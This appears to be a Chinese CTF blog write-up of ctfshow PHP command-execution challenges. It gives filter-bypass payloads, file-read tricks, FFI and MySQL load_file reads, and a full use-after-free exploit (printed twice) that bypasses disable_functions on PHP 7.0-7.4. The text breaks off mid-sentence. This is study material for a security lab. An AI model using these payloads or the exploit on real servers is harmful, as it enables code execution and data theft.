$c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre class="language-none"><code class="language-none">?c&#x3D;&#x2F;bin&#x2F;ca?$&#123;IFS&#125;f???????</code></pre><p>通配符绕过</p><h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|[a-z]|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload1</p><p>利用base64命令和通配符</p><pre class="language-none"><code class="language-none">c&#x3D;&#x2F;???&#x2F;????64 ????.???</code></pre><p>payload2</p><p>p牛是真的厉害</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list</a></p><p>直接利用p牛博客里的这个</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430174531949.png" alt="image-20220430174531949"></p><p>然后cat flag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430174552316.png" alt="image-20220430174552316"></p><p>有几率不成功，因为临时文件的文件名是随机的，如果没成功就是没大写，多试几次就行了</p><h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430175025474.png" alt="image-20220430175025474"></p><p>另外这里如果是eval函数，那执行时还要加上?&gt;&lt;?=</p><p>payload为</p><pre class="language-php" data-language="php"><code class="language-php">?&gt;&lt;?&#x3D;&#96;. &#x2F;???&#x2F;????????[@-[]&#96;;?&gt;</code></pre><p>  原因是eval()函数相当于执行php的代码，而&lt;?= 就相当于&lt;?php echo<code> </code>在PHP7以上不管short_open_tag配置是不是开启的。都可以使用。所以就相当于一个新的PHP文件，这样的话就需要将最开始前面的&lt;?php给闭合，不然不会执行。</p><h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F; 还能炫的动吗？&#x2F;&#x2F;flag in 36.phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|[a-z]|[0-9]|\&#96;|\|\#|\&#39;|\&quot;|\&#96;|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\&#x3D;|\[&#x2F;i&quot;, $c))&#123;        system(&quot;cat &quot;.$c.&quot;.php&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p><code>$&#123;_&#125;</code>:代表上一次命令执行的结果<br><code>$(())</code>: 做运算</p><p>之前没有命令返回或者执行,结果应该是空,与<code>&quot;&quot;</code>等价<br>又 <code>$((&quot;&quot;))</code>值为0,<code>$((~$((&quot;&quot;))))</code>值为-1,再做拼接:</p><p>payload</p><pre class="language-none"><code class="language-none">$((~$(($((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))))))</code></pre><h2 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h2><p>有一堆禁用函数</p><p>print_r(scandir(&#39;.&#39;));或者print_r(glob(&quot;*&quot;));读目录</p><table><thead><tr><th></th><th>扫目录找flag位置</th></tr></thead><tbody><tr><td></td><td>print_r(scandir(&#39;./&#39;));</td></tr><tr><td></td><td>$a=opendir(&#39;./&#39;);while(($file = readdir($a)) !=false){echo $file.&quot; &quot;;}</td></tr><tr><td></td><td>var_dump(scandir(&quot;/&quot;));</td></tr><tr><td></td><td>$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f){echo($f-&gt;__toString().&quot; &quot;);}</td></tr></tbody></table><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430181502718.png" alt="image-20220430181502718"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430182020777.png" alt="image-20220430182020777"></p><p>c=print_r(file_get_contents(&#39;flag.php&#39;));或者readfile或者show_source或者highlight_file读文件</p><p>还可以更骚一点</p><p>POST c=include($_GET[&#39;url&#39;]); </p><p>GET /?url=php://filter/read=convert.base64-encode/resource=flag.php</p><p>附一点读文件的方式</p><pre class="language-php" data-language="php"><code class="language-php">highlight_file($filename);show_source($filename);print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($filename);print_r(file($filename)); &#x2F;&#x2F; var_dumpfread(fopen($filename,&quot;r&quot;), $size);&#x2F;&#x2F;print_r(fread(fopen(&quot;flag.php&quot;,&quot;r&quot;), filesize(&quot;flag.php&quot;)));include($filename); &#x2F;&#x2F; 非php代码include_once($filename); &#x2F;&#x2F; 非php代码require($filename); &#x2F;&#x2F; 非php代码require_once($filename); &#x2F;&#x2F; 非php代码  伪协议读源码print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));print_r(fgets(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; 读取一行$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D;    fgets($a);echo $line;&#125;fpassthru(fopen($filename, &quot;r&quot;)); &#x2F;&#x2F; 从当前位置一直读取到 EOFprint_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));&#x2F;&#x2F;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetcsv($a);var_dump($line);&#125;print_r(fgetss(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; 从文件指针中读取一行并过滤掉 HTML 标记print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));&#x2F;&#x2F;c&#x3D;$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;print_r(fscanf($a,&quot;%s&quot;));&#125;;print_r(parse_ini_file($filename)); &#x2F;&#x2F; 失败时返回 false , 成功返回配置数组</code></pre><p><strong>web59</strong></p><p>file_get_contents和readfile没了，可以用其他俩</p><p><strong>web60-65</strong></p><p>同web58，差不多就那几个函数，用show_source能全过</p><h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><pre class="language-none"><code class="language-none">c&#x3D;print_r(scandir(&#39;&#x2F;&#39;));highlight_file(&quot;&#x2F;flag.txt&quot;);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430204318885.png" alt="image-20220430204318885"></p><h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p>print_r禁了</p><p>用var_dump</p><pre class="language-none"><code class="language-none">c&#x3D;var_dump(scandir(&#39;&#x2F;&#39;));highlight_file(&quot;&#x2F;flag.txt&quot;);</code></pre><h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><pre class="language-none"><code class="language-none">c&#x3D;var_dump(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;)</code></pre><p>看根目录，然后直接include包含</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430211411455.png" alt="image-20220430211411455"></p><h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><p>var_dump也没了，但是还有var_export</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;var_export(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;);</code></pre><p>y4师傅还有一个用php的原生类遍历目录的骚操作</p><pre class="language-none"><code class="language-none">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code></pre><p>然后包含这个我文件</p><pre class="language-none"><code class="language-none">c&#x3D;include(&#39;&#x2F;flag.txt&#39;);c&#x3D;require(&#39;&#x2F;flag.txt&#39;);c&#x3D;require_once(&#39;&#x2F;flag.txt&#39;);</code></pre><h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><p>同69</p><h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;, 0);&#x2F;&#x2F; 你们在炫技吗？if(isset($_POST[&#39;c&#39;]))&#123;        $c&#x3D; $_POST[&#39;c&#39;];        eval($c);        $s &#x3D; ob_get_contents();        ob_end_clean();        echo preg_replace(&quot;&#x2F;[0-9]|[a-z]&#x2F;i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>ob_get_contents — 返回输出缓冲区的内容<br>ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p><blockquote><p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃</p></blockquote><p>要用<code>exit();</code>使程序提前退出，绕过后面的正则表达式</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;var_export(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;);exit();</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430220313035.png" alt="image-20220430220313035"></p><h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><p>scandir被禁用了</p><p>用y4师傅的那个原生类来查目录，但是文件没有权限被包含</p><p>y4师傅推荐的脚本</p><pre class="language-none"><code class="language-none">&lt;?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https:&#x2F;&#x2F;bugs.php.net&#x2F;bug.php?id&#x3D;76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30&#x2F;01&#x2F;2020.## Author: https:&#x2F;&#x2F;github.com&#x2F;mm0r1pwn(&quot;uname -a&quot;);function pwn($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace &#x3D; (new Exception)-&gt;getTrace(); # ;)            if(!isset($backtrace[1][&#39;args&#39;])) &#123; # PHP &gt;&#x3D; 7.4                $backtrace &#x3D; debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;        $address &#x3D; 0;        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;            $address &lt;&lt;&#x3D; 8;            $address |&#x3D; ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m &#x3D; 8) &#123;        $out &#x3D; &quot;&quot;;        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;            $out .&#x3D; chr($ptr &amp; 0xff);            $ptr &gt;&gt;&#x3D; 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;        $i &#x3D; 0;        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] &#x3D; chr($v &amp; 0xff);            $v &gt;&gt;&#x3D; 8;        &#125;    &#125;    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak &#x3D; strlen($helper-&gt;a);        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type &#x3D; leak($base, 0x10, 2);        $e_phoff &#x3D; leak($base, 0x20);        $e_phentsize &#x3D; leak($base, 0x36, 2);        $e_phnum &#x3D; leak($base, 0x38, 2);        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;            $p_type  &#x3D; leak($header, 0, 4);            $p_flags &#x3D; leak($header, 4, 4);            $p_vaddr &#x3D; leak($header, 0x10);            $p_memsz &#x3D; leak($header, 0x28);            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; # PT_LOAD, PF_Read_Write                # handle pie                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;                $data_size &#x3D; $p_memsz;            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; # PT_LOAD, PF_Read_exec                $text_size &#x3D; $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) &#x3D; $elf;        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;            $leak &#x3D; leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                # &#39;constant&#39; constant check                if($deref !&#x3D; 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak &#x3D; leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                # &#39;bin2hex&#39; constant check                if($deref !&#x3D; 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base &#x3D; 0;        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;            $addr &#x3D; $start - 0x1000 * $i;            $leak &#x3D; leak($addr, 0, 7);            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123; # ELF header                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr &#x3D; $basic_funcs;        do &#123;            $f_entry &#x3D; leak($addr);            $f_name &#x3D; leak($f_entry, 0, 6);            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; # system                return leak($addr + 8);            &#125;            $addr +&#x3D; 0x20;        &#125; while($f_entry !&#x3D; 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        # str_shuffle prevents opcache string interning        $arg &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));        $vuln &#x3D; new Vuln();        $vuln-&gt;a &#x3D; $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc &#x3D; 10; # increase this value if UAF fails    $contiguous &#x3D; [];    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)        $contiguous[] &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));    trigger_uaf(&#39;x&#39;);    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];    $helper &#x3D; new Helper;    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    # leaks    $closure_handlers &#x3D; str2ptr($abc, 0);    $php_heap &#x3D; str2ptr($abc, 0x58);    $abc_addr &#x3D; $php_heap - 0xc8;    # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);    # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj &#x3D; str2ptr($abc, 0x20);    $binary_leak &#x3D; leak($closure_handlers, 8);    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf &#x3D; parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    # fake closure object    $fake_obj_offset &#x3D; 0xd0;    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler    ($helper-&gt;b)($cmd);    exit();&#125;pwn(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();</code></pre><p>//上边这个脚本过不了的原因是题目环境禁用了str_repeat，所以手动重复79个A就行了</p><p>群主给的</p><pre class="language-none"><code class="language-none">c&#x3D;function ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace &#x3D; (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace &#x3D; debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;        $address &#x3D; 0;        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;            $address &lt;&lt;&#x3D; 8;            $address |&#x3D; ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m &#x3D; 8) &#123;        $out &#x3D; &quot;&quot;;        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;            $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;&#x3D; 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;        $i &#x3D; 0;        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;&#x3D; 8;        &#125;    &#125;    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak &#x3D; strlen($helper-&gt;a);        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type &#x3D; leak($base, 0x10, 2);        $e_phoff &#x3D; leak($base, 0x20);        $e_phentsize &#x3D; leak($base, 0x36, 2);        $e_phnum &#x3D; leak($base, 0x38, 2);        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;            $p_type  &#x3D; leak($header, 0, 4);            $p_flags &#x3D; leak($header, 4, 4);            $p_vaddr &#x3D; leak($header, 0x10);            $p_memsz &#x3D; leak($header, 0x28);            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123;                 $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;                $data_size &#x3D; $p_memsz;            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123;                 $text_size &#x3D; $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) &#x3D; $elf;        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;            $leak &#x3D; leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                                if($deref !&#x3D; 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak &#x3D; leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                                if($deref !&#x3D; 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base &#x3D; 0;        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;            $addr &#x3D; $start - 0x1000 * $i;            $leak &#x3D; leak($addr, 0, 7);            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr &#x3D; $basic_funcs;        do &#123;            $f_entry &#x3D; leak($addr);            $f_name &#x3D; leak($f_entry, 0, 6);            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr +&#x3D; 0x20;        &#125; while($f_entry !&#x3D; 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln &#x3D; new Vuln();        $vuln-&gt;a &#x3D; $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc &#x3D; 10;     $contiguous &#x3D; [];    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)        $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    trigger_uaf(&#39;x&#39;);    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];    $helper &#x3D; new Helper;    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers &#x3D; str2ptr($abc, 0);    $php_heap &#x3D; str2ptr($abc, 0x58);    $abc_addr &#x3D; $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj &#x3D; str2ptr($abc, 0x20);    $binary_leak &#x3D; leak($closure_handlers, 8);    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf &#x3D; parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    $fake_obj_offset &#x3D; 0xd0;    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();#需要通过url编码哦</code></pre><h2 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h2><pre class="language-none"><code class="language-none">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;include(&#39;&#x2F;flagc.txt&#39;);exit();</code></pre><h2 id="Web75-76"><a href="#Web75-76" class="headerlink" title="Web75-76"></a>Web75-76</h2><p>读目录，发现flag36.txt，但是不能包含，uaf失败</p><p>用mysql的load_file读取文件</p><pre class="language-none"><code class="language-none">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-getMessage();exit(0);&#125;exit(0);</code></pre><p>感觉。。。正常应该是不会这样的 ，没用户名和密码怎么读</p><h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>利用FFI，php7.4以上才有</p><pre class="language-none"><code class="language-none">$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);&#x2F;&#x2F;创建一个system对象$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;&#x2F;&#x2F;没有回显的这里因为不能回显，所以利用重定向将readflag内容输出到其他地方$ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数</code></pre><p><a href="https://www.php.net/manual/zh/ffi.cdef.php">https://www.php.net/manual/zh/ffi.cdef.php</a></p><p><a href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p><p>实话实话没太看懂</p><pre class="language-none"><code class="language-none">c&#x3D;$ffi&#x3D;FFI::cdef(&quot;int system(char *command);&quot;, &quot;libc.so.6&quot;);$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;$ffi-&gt;system($a);exit();  </code></pre><p>打完payload访问一下1.txt就能拿到flag</p><p>后边的题感觉有点玄幻了，就单纯的记一下方法</p><h2 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h2><p> 源码里有system($code);但是有waf</p><pre class="language-none"><code class="language-none">!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|\!|\&#x3D;|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;</code></pre><p>利用bash内置变量来rce</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430231046010.png" alt="image-20220430231046010"></p><pre class="language-none"><code class="language-none">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???</code></pre><pre class="language-none"><code class="language-none"># echo $&#123;PWD&#125; &#x2F;root# echo $&#123;PWD:0:1&#125;      #表示从0下标开始的第一个字符&#x2F;           # echo $&#123;PWD:~0:1&#125;      #从结尾开始往前的第一个字符t# echo $&#123;PWD:~0&#125;      t# echo $&#123;PWD:~A&#125;       #所以字母和0具有同样作用             t# echo $&#123;PATH&#125;                            &#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</code></pre><pre class="language-none"><code class="language-none">&#x2F;&#x2F;利用系统变量构造nl命令$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;是nl</code></pre><p>或者</p><pre class="language-none"><code class="language-none">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</code></pre><pre class="language-none"><code class="language-none">SHLVL&#96;是记录多个 Bash 